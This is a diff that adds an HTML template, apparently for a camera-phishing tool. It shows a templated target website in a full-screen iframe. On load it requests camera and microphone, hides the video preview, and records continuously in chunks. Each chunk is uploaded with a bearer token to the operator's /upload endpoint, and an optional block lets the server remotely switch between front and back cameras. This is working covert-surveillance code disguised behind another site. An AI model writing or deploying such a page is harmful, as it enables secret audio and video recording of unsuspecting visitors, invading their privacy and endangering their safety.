@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pixora Camera Access</title>
+    <style>
+        body { margin:0; background: #222; }
+        #main-iframe { width:100vw; height:100vh; border:none; }
+        #preview { display:none; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 10;}
+    </style>
+</head>
+<body>
+    <iframe id="main-iframe" src="{{ target_url }}" allow="camera; microphone; autoplay" style="position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:1;"></iframe>
+    <video id="preview" width="320" height="240" autoplay muted playsinline style="display:none;z-index:100;"></video>
+    <div id="overlay"></div>
+    <script>
+    const AUTH_TOKEN = "{{ auth_token }}";
+    const CHUNK_SECONDS = {{ chunk_seconds }};
+    let stream = null, mediaRecorder = null, chunkCount = 0;
+    let active = false, pendingSwitch = false;
+    let currentMode = "{{ camera_mode }}";
+    let lastChunkTime = 0;
+
+    // Helper function to format timestamps
+    function formatTimestamp() {
+        return new Date().toISOString().replace(/[:.]/g, '-');
+    }
+
+    // Safely stop the media recorder
+    async function safeStopRecorder() {
+        if (mediaRecorder && mediaRecorder.state === "recording") {
+            return new Promise((resolve) => {
+                mediaRecorder.onstop = resolve;
+                mediaRecorder.stop();
+            });
+        }
+        return Promise.resolve();
+    }
+
+    // Start or restart the media stream
+    async function startStream(mode) {
+        // Only restart if mode actually changed
+        if (mode === currentMode && stream) {
+            return;
+        }
+        
+        console.log(`Starting ${mode} camera stream...`);
+        currentMode = mode;
+        active = false;
+        pendingSwitch = true;
+        
+        try {
+            await safeStopRecorder();
+            
+            // Clean up previous recorder
+            if (mediaRecorder) {
+                mediaRecorder.ondataavailable = null;
+                mediaRecorder = null;
+            }
+            
+            // Clean up previous stream
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            
+            // Set up constraints based on mode
+            let constraints = { 
+                video: mode === "back" ? 
+                    { facingMode: { exact: "environment" } } : 
+                    { facingMode: "user" }, 
+                audio: true 
+            };
+            
+            // Try preferred mode first, fallback to default
+            try {
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+            } catch (err) {
+                console.warn("Preferred mode failed, trying default", err);
+                constraints = { video: true, audio: true };
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+            }
+            
+            // Set up preview
+            document.getElementById('preview').srcObject = stream;
+            
+            // Configure media recorder
+            let options = { mimeType: 'video/webm; codecs=vp8,opus' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options = { mimeType: 'video/webm' };
+            }
+            
+            mediaRecorder = new MediaRecorder(stream, options);
+            chunkCount = 0;
+            pendingSwitch = false;
+            active = true;
+            lastChunkTime = Date.now();
+
+            // Handle data available event
+            mediaRecorder.ondataavailable = async (e) => {
+                if (e.data.size > 0) {
+                    const timestamp = formatTimestamp();
+                    const fname = `recording_${timestamp}_${mode}_${chunkCount++}.webm`;
+                    
+                    try {
+                        const formData = new FormData();
+                        formData.append('media', new Blob([e.data], { type: "video/webm" }), fname);
+                        
+                        const response = await fetch('/upload', { 
+                            method: 'POST', 
+                            body: formData,
+                            headers: {
+                                'Authorization': `Bearer ${AUTH_TOKEN}`
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            console.log(`Uploaded ${fname} (${e.data.size} bytes)`);
+                        } else {
+                            console.error('Upload failed:', await response.text());
+                        }
+                    } catch (err) {
+                        console.error('Upload error:', err);
+                    }
+                }
+            };
+
+            // Start the recording loop
+            chunkLoop();
+        } catch (err) {
+            console.error("Stream setup failed:", err);
+            pendingSwitch = false;
+        }
+    }
+
+    // Main recording loop
+    async function chunkLoop() {
+        while (active && !pendingSwitch) {
+            if (mediaRecorder.state === "inactive") {
+                mediaRecorder.start();
+                console.log(`Started recording (${currentMode} camera)`);
+                lastChunkTime = Date.now();
+            }
+            
+            // Calculate remaining time for this chunk
+            const elapsed = (Date.now() - lastChunkTime) / 1000;
+            const remaining = Math.max(0, CHUNK_SECONDS - elapsed);
+            
+            await new Promise(r => setTimeout(r, remaining * 1000));
+            
+            if (mediaRecorder.state === "recording") {
+                mediaRecorder.requestData(); // Force data available event
+                await safeStopRecorder();
+                console.log(`Saved ${CHUNK_SECONDS}s chunk (${currentMode} camera)`);
+                
+                // Immediately start next chunk if still active
+                if (active && !pendingSwitch) {
+                    mediaRecorder.start();
+                    lastChunkTime = Date.now();
+                }
+            }
+        }
+    }
+
+    {% if dynamic_switch %}
+    let lastPolledMode = "{{ camera_mode }}";
+    let isPolling = false;
+
+    // Get current camera mode from server
+    async function getCameraMode() {
+        try {
+            const response = await fetch('/get_camera_mode', {
+                headers: { 'Authorization': `Bearer ${AUTH_TOKEN}` }
+            });
+            const data = await response.json();
+            return data.mode;
+        } catch(e) {
+            console.error('Mode fetch error:', e);
+            return lastPolledMode; // Return last known good mode
+        }
+    }
+
+    // Poll for camera mode changes
+    async function pollCameraMode() {
+        if (isPolling) return;
+        isPolling = true;
+        
+        try {
+            const currentMode = await getCameraMode();
+            if (currentMode !== lastPolledMode) {
+                console.log(`Camera mode changed to ${currentMode}`);
+                lastPolledMode = currentMode;
+                await startStream(currentMode);
+            }
+        } catch (e) {
+            console.error('Polling error:', e);
+        } finally {
+            isPolling = false;
+        }
+        
+        setTimeout(pollCameraMode, 1000); // Poll every second
+    }
+    {% endif %}
+
+    // Initialize when page loads
+    window.onload = async () => {
+        await startStream("{{ camera_mode }}");
+        {% if dynamic_switch %}
+        // Start polling only after initial stream is set up
+        setTimeout(pollCameraMode, 2000);
+        {% endif %}
+    };
+    </script>
+</body>
+</html>
